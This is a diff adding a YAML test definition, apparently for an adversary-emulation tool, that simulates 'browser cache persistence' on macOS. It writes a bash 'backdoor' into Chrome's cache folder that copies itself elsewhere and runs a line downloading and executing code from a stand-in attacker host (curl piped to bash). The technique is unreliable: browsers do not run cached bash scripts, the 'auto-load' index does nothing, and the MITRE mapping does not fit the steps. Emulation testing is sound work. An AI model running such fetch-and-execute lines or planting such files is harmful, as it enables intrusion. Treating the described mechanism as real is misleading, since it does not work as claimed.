@@ -1,0 +1,71 @@
+api_version: 2.0
+uuid: 12345678-eeee-eeee-eeee-eeeeeeeeeeee
+name: Browser cache persistence
+description: Uses browser cache for persistent backdoor installation and payload delivery
+mitre_attack_id: T1185
+mitre_attack_technique: Browser Session Hijacking
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  browser_cache_dir:
+    description: Path to browser cache directory
+    type: string
+    default: ~/Library/Caches/Google/Chrome
+  payload_file:
+    description: Name of payload file to cache
+    type: string
+    default: cache_payload.bin
+  cache_key:
+    description: Cache key identifier
+    type: string
+    default: persistent_cache_key
+steps:
+  - name: create_cache_directory
+    type: shell_command
+    command: "mkdir -p {{ browser_cache_dir }}"
+  
+  - name: create_cached_payload
+    type: create_file
+    path: "{{ browser_cache_dir }}/{{ payload_file }}"
+    contents: |
+      #!/bin/bash
+      # Cached payload
+      # This file serves as a persistent backdoor
+      # Executed when browser cache is loaded
+      
+      # Maintain persistence
+      mkdir -p ~/.cache_backup
+      cp "$0" ~/.cache_backup/$(date +%s).bin
+      
+      # Execute malicious operations
+      curl -s http://attacker.com/payload | bash &
+    permissions: "0755"
+  
+  - name: create_cache_index
+    type: create_file
+    path: "{{ browser_cache_dir }}/cache_index.dat"
+    contents: |
+      // Cache index mapping
+      // Persistence key: {{ cache_key }}
+      // Payload: {{ payload_file }}
+      // Execution: auto-load
+    permissions: "0644"
+
+checks:
+  - type: file_exists
+    path: "{{ browser_cache_dir }}/{{ payload_file }}"
+  - type: file_exists
+    path: "{{ browser_cache_dir }}/cache_index.dat"
+
+cleanup:
+  - type: remove_file
+    path: "{{ browser_cache_dir }}/{{ payload_file }}"
+  - type: remove_file
+    path: "{{ browser_cache_dir }}/cache_index.dat"
+  - type: shell_command
+    command: "rm -rf ~/.cache_backup"
+    on_error: ignore
